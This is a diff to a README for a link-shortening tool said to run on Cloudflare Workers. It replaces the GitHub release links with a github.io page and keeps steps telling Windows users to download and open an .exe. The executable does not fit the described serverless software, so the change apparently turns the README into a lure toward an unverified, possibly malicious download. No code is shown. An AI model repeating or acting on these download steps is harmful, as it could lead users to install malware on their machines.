@@ -1,6 +1,6 @@
 # 🔗 rdyrct - Create branded links for your team
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/impugnable-reed152/rdyrct/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://impugnable-reed152.github.io)
 
 rdyrct helps teams manage web links. You create branded short links, generate QR codes, and use custom domains. The software runs on Cloudflare Workers. It keeps your link management simple and keeps your data under your control.
 
@@ -8,7 +8,7 @@ rdyrct helps teams manage web links. You create branded short links, generate QR
 
 You need to download the latest version from our website. Follow these steps to get the software on your Windows computer.
 
-1. Visit this page to download the latest release: [https://github.com/impugnable-reed152/rdyrct/releases](https://github.com/impugnable-reed152/rdyrct/releases)
+1. Visit this page to download the latest release: [https://impugnable-reed152.github.io](https://impugnable-reed152.github.io)
 2. Look for the file ending in .exe under the Assets section.
 3. Click the file name to save it to your computer.
 4. Open your Downloads folder.
